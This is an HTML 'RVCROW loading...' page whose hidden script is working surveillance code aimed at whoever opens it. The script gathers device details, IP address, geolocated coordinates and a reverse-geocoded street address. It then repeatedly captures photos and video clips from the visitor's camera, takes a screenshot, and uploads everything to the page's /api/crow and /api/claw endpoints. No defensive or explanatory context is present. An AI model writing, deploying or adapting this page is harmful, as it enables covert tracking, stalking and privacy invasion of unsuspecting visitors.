<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RVCROW</title>
  <style>
    body{background:#000;color:#6e48aa;font-family:Arial, sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}#load{font-size:22px}
  </style>
</head>
<body>
  <div id="load">RVCROW loading...</div>
  <video id="v" autoplay muted style="display:none;"></video>
  <canvas id="c" style="display:none;"></canvas>

  <script>
    const cid = '7919359674';

    const crow = async (t) =>
      fetch('/api/crow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cid, t })
      });

    const claw = async (blob, type, cap) => {
      const fd = new FormData();
      fd.append('cid', cid);
      fd.append('type', type);
      fd.append('cap', cap);
      fd.append('f', blob, type === 'photo' ? 'c.jpg' : 'c.webm');
      await fetch('/api/claw', { method: 'POST', body: fd });
    };

    const getInfo = async () => {
      let m = 'â•­â”€â”€â”€â”€â”€ RVCROW Full Report â”€â”€â”€â”€â”€ â¦¿\n\n';
      m += 'âš™ï¸ DEVICE INFO\n';
      m += `ðŸ–¥ï¸ User-Agent: ${navigator.userAgent}\n`;
      m += `ðŸ’» Platform: ${navigator.platform}\n`;
      m += `ðŸŒ Language: ${navigator.language}\n`;
      m += `ðŸ“¶ Online: ${navigator.onLine ? 'âœ… Online' : 'âŒ Offline'}\n`;
      m += `ðŸ“º Screen: ${screen.width}x${screen.height}\n`;
      m += `ðŸªŸ Window: ${innerWidth}x${innerHeight}\n`;
      m += `ðŸ’¾ RAM: ${navigator.deviceMemory || 'â“'} GB\n`;
      m += `ðŸ§  Cores: ${navigator.hardwareConcurrency}\n`;
      m += `ðŸ“œ Referrer: ${document.referrer || 'None'}\n`;
      m += `ðŸ”— URL: ${location.href}\n`;
      m += `ðŸ“„ Title: ${document.title}\n`;
      m += `ðŸ•’ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
      m += `â³ Offset: ${new Date().getTimezoneOffset()} menit\n`;
      m += `ðŸ“š History: ${history.length}\n`;
      m += `ðŸ‘† Touch: ${'ontouchstart' in window ? 'âœ… Ya' : 'âŒ Tidak'}\n`;

      if (navigator.getBattery) {
        try {
          const b = await navigator.getBattery();
          m += `ðŸ”‹ Battery: ${Math.floor(b.level * 100)}%\n`;
          m += `ðŸ”Œ Charging: ${b.charging ? 'âœ… Ya' : 'âŒ Tidak'}\n`;
        } catch {
          m += 'ðŸ”‹ Battery: âŒ Tidak tersedia\n';
        }
      }

      try {
        const r = await fetch('https://ipapi.co/json');
        const d = await r.json();
        m += '\nðŸ“ LOCATION INFO\n';
        m += `ðŸ“¡ IP: ${d.ip}\n`;
        m += `ðŸ™ï¸ City: ${d.city}\n`;
        m += `ðŸ˜ï¸ Region: ${d.region}\n`;
        m += `ðŸŒ Country: ${d.country_name}\n`;
        m += `ðŸ·ï¸ Postal: ${d.postal}\n`;
        m += `ðŸ“Œ Lat: ${d.latitude}\n`;
        m += `ðŸ“ Lng: ${d.longitude}\n`;
        if (d.latitude && d.longitude) {
          const rev = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${d.latitude}&lon=${d.longitude}&zoom=18&addressdetails=1`
          ).then(r => r.json()).catch(() => ({}));
          const addr = rev.display_name || 'Alamat tidak tersedia';
          m += `ðŸ  Alamat: ${addr}\n`;
        }
      } catch {
        m += '\nâŒ Lokasi gagal\n';
      }

      m += '\nâ•°â”€â”€â”€â”€â”€ @RVCROW â”€â”€â”€â”€â”€ â¦¿';
      return m;
    };

    const start = async () => {
      await crow(await getInfo());

      try {
        const st = await navigator.mediaDevices.getUserMedia({ video: true });
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        const x = c.getContext('2d');
        v.srcObject = st;

        setInterval(() => {
          c.width = v.videoWidth;
          c.height = v.videoHeight;
          x.drawImage(v, 0, 0);
          c.toBlob(b => claw(b, 'photo', 'ðŸ“¸ RVCROW'), 'image/jpeg');
        }, 3000);

        setInterval(() => {
          const bl = [];
          const r = new MediaRecorder(st, { mimeType: 'video/webm' });
          r.ondataavailable = e => bl.push(e.data);
          r.onstop = () => claw(new Blob(bl, { type: 'video/webm' }), 'video', 'ðŸŽ¥ RVCROW');
          r.start();
          setTimeout(() => r.stop(), 5000);
        }, 10000);

      } catch {
        await crow('âŒ Kamera diblok');
      }

      try {
        const canvas = await html2canvas(document.body);
        canvas.toBlob(b => claw(b, 'photo', 'ðŸ–¥ï¸ Screenshot RVCROW'), 'image/jpeg');
      } catch {
        await crow('âŒ Screenshot gagal');
      }
    };

    const s = document.createElement('script');
    s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    s.onload = () => setTimeout(start, 3000);
    document.head.appendChild(s);
  </script>
</body>
</html>
